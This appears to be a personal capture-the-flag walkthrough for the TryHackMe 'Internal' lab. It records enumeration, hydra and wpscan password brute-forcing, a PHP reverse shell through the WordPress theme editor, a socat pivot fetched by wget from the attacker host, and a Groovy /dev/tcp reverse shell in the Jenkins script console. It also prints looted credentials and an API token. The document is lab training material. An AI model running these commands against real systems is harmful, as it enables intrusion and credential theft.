@@ -1,0 +1,228 @@
+# https://tryhackme.com/room/internal
+
+export IP=10.10.152.235
+
+/snap/bin/rustscan -a $IP -t 1000 --ulimit 5000 -- -sV -sC -Pn
+
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzpZTvmUlaHPpKH8X2SHMndoS+GsVlbhABHJt4TN/nKUSYeFEHbNzutQnj+DrUEwNMauqaWCY7vNeYguQUXLx4LM5ukMEC8IuJo0rcuKNmlyYrgBlFws3q2956v8urY7/McCFf5IsItQxurCDyfyU/erO7fO02n2iT5k7Bw2UWf8FPvM9/jahisbkA9/FQKou3mbaSANb5nSrPc7p9FbqKs1vGpFopdUTI2dl4OQ3TkQWNXpvaFl0j1ilRynu5zLr6FetD5WWZXAuCNHNmcRo/aPdoX9JXaPKGCcVywqMM/Qy+gSiiIKvmavX6rYlnRFWEp25EifIPuHQ0s8hSXqx5
+|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMFOI/P6nqicmk78vSNs4l+vk2+BQ0mBxB1KlJJPCYueaUExTH4Cxkqkpo/zJfZ77MHHDL5nnzTW+TO6e4mDMEw=
+|   256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (EdDSA)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMlxubXGh//FE3OqdyitiEwfA2nNdCtdgLfDQxFHPyY0
+80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+#using memoryleak.py with no result
+#using shell shock wityh no result
+#no robots.txt
+
+gobuster dir -u http://$IP --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --threads=128 --wildcard
+
+
+/blog                 (Status: 301) [Size: 313] [--> http://10.10.152.235/blog/]
+/wordpress            (Status: 301) [Size: 318] [--> http://10.10.152.235/wordpress/]
+/javascript           (Status: 301) [Size: 319] [--> http://10.10.152.235/javascript/]
+/phpmyadmin           (Status: 301) [Size: 319] [--> http://10.10.152.235/phpmyadmin/]
+
+wpscan --url http://10.10.152.235/wordpress/ --api-token 5Fux4eEKLaNpoWz5eveEnUjrxfoCfDriAM3vf5IcpyY -e u
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.18
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.10.152.235/wordpress/ [10.10.152.235]
+[+] Started: Sat Jul 17 09:59:18 2021
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.152.235/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.10.152.235/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.152.235/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.10.152.235/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.10.152.235/wordpress/, Match: 'WordPress 5.4.2'
+ |
+ | [!] 2 vulnerabilities identified:
+ |
+ | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure
+ |     Fixed in: 5.4.5
+ |     References:
+ |      - https://wpscan.com/vulnerability/6a3ec618-c79e-4b9c-9020-86b157458ac5
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29450
+ |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
+ |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
+ |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pmmh-2f36-wvhq
+ |      - https://core.trac.wordpress.org/changeset/50717/
+ |      - https://www.youtube.com/watch?v=J2GXmxAdNWs
+ |
+ | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
+ |     Fixed in: 5.4.6
+ |     References:
+ |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296
+ |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62
+ |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/
+ |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9
+ |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/
+ |      - https://www.youtube.com/watch?v=HaW15aMzBUM
+
+[i] The main theme could not be detected.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:01 <===============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:01
+
+[i] No Users Found.
+
+[+] WPScan DB API OK
+ | Plan: free
+ | Requests Done (during the scan): 1
+ | Requests Remaining: 24
+
+[+] Finished: Sat Jul 17 09:59:24 2021
+[+] Requests Done: 23
+[+] Cached Requests: 27
+[+] Data Sent: 5.193 KB
+[+] Data Received: 11.632 KB
+[+] Memory used: 107.492 MB
+[+] Elapsed time: 00:00:06
+
+
+#trying to brute force the login
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm --cookie 'wordpress_test_cookie=WP+Cookie+check' http-post-form "/wordpress/wp-admin/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.189.58%2Fwordpress%2Fwp-admin%2F&testcookie=1:Unknown username." -vv
+
+# added the ip into the /etc/hosts as internal.thm
+# running a new scan on blog
+wpscan --url http://internal.thm/blog/ --api-token 5Fux4eEKLaNpoWz5eveEnUjrxfoCfDriAM3vf5IcpyY -e
+
+
+# usoing https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+
+# trying brute forcin using wpscan
+wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt -t 64
+
+[+] Performing password attack on Xmlrpc against 1 user/s
+[SUCCESS] - admin / my2boys                                                                                                                                                                                                                  
+Trying admin / bumbum Time: 00:01:42 <                                                                                                                                                              > (3904 / 14348295)  0.02%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: admin, Password: my2boys
+
+# after login  go to http://internal.thm/blog/wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen
+
+# replace the content the a php.reverse shell
+
+# run $nc -nlvp 1234
+
+#open page http://internal.thm/blog/index.php/2020/08/03/hello-world1/
+
+# Get the shell
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+
+# cheat There is an interesting file in the /opt directory: 
+
+cat wp-save.txt
+Bill,
+
+Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
+
+aubreanna:bubb13guM!@#123
+
+cat jenkins.txt
+
+# Internal Jenkins service is running on 172.17.0.2:8080
+
+# port 8080 does not answer to anything but localhost
+netstat -tan | grep 8080
+
+netstat -tan | grep 8080
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN
+
+# we have to upload the socat to access the 8080 on another port
+# copied the socat to the internal directory
+
+wget http://10.13.19.67:8000/socat
+chmod +x socat
+
+./socat TCP-LISTEN:8888,fork TCP:127.0.0.1:8080 &
+
+# trying to brute force the jenkins
+
+# Request: j_username=USER&j_password=PASS&from=%2F&Submit=Sign+in
+# hydra port number -s 8888
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.189.58 -s 8888 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" -vv -t 64
+
+[8888][http-post-form] host: 10.10.189.58   login: admin   password: spongebob
+
+
+# CHEAT
+
+Now, in Jenkins, go to “Jenkins > Nodes > master” and click on “Script Console” from the menu. Execute the following command 
+
+# Manage Jenkins > Script Console
+
+https://alionder.net/jenkins-script-console-code-exec-reverse-shell-java-deserialization/
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.13.19.67/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+# getting reverse shell
+whoami
+jenkins
+
+cat /opt/note.txt
+
+Aubreanna,
+
+Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
+need access to the root user account.
+
+root:tr0ub13guM!@#123
+
